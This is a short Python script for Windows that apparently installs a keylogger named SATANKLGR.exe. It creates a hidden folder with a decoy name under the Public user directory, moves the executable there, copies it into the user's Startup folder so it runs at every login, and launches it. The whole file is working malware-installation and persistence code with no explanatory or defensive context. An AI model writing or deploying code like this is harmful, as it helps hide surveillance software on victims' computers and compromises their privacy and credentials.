import shutil
import getpass
import os
import ctypes

os.mkdir("C:\\Users\\Public\\Public 3D Objects")
ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)

shutil.move("SATANKLGR.exe", "C:\\Users\\Public\\Public 3D Objects\\")

USER_NAME = getpass.getuser()
path_to_file = r"C:\Users\Public\Public 3D Objects\SATANKLGR.exe"
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
shutil.copy(path_to_file, bat_path)

os.startfile(r"C:\Users\Public\Public 3D Objects\SATANKLGR.exe")